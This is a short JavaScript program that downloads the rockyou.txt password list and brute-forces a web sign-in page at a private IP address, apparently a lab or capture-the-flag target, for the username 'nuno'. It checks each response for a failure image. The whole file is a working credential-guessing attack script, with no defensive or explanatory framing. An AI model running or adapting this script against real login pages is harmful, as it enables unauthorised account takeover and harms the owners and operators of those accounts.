async function main() {
  const response = await fetch(
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
  );
  console.log("downloaded dictionary file...");
  const text = await response.text();
  console.log("parsed body...");
  const dictionary = text.split("\n");
  console.log("splited words...");

  let startTime = new Date().getTime() / 1000;

  for (let i = 0; i < dictionary.length; i++) {
    let word = dictionary[i];
    const response = await fetch(
      `http://192.168.1.200/index.php?page=signin&username=nuno&password=${word}&Login=Login#`
    );
    const text = await response.text();
    if (!text.includes("WrongAnswer.gif")) {
      console.log(word, "CRACKED!!!!");
      console.log("time", new Date().getTime() / 1000 - startTime);
      return;
    } else {
      console.log(i, word, "FAILED");
    }
  }
}
main().then();
